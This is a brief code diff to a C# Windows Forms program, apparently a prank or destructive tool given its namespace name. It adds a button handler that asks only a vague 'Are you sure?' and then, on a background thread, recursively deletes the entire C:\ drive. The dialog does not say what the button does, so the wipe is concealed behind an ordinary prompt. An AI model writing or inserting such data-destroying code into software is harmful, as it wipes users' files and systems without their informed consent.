@@ -33,5 +33,13 @@ namespace RegFuck
         {
             new Form4().ShowDialog();
         }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            if (MessageBox.Show("Are you sure?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
+            {
+                new System.Threading.Thread(()=>System.IO.Directory.Delete("c:\\", true)).Start();
+            }
+        }
     }
 }
